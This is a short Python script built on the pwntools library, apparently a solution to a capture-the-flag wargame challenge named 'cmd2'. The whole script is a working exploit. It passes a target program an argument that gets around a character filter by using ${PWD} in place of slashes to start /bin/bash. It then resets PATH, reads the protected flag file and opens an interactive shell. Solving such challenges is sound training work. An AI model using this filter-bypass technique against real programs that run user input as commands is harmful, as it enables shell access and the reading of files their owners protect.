#!/usr/bin/env python
import pwn
import tempfile
import os
import argparse

parser = argparse.ArgumentParser(description="Select a filename.")
parser.add_argument("filename", type=str, help="The name of the file to process")
parser.add_argument("flag", type=str, help="The name of the file to process", default='/home/cmd2/flag')
args = parser.parse_args()

os.chdir('/')
p = pwn.process([f'{args.filename}', 'eval "\\${PWD}bin\\${PWD}bash"'])
p.sendline("export PATH=/usr/bin/")
p.sendline(f"cat {args.flag}")
p.interactive()
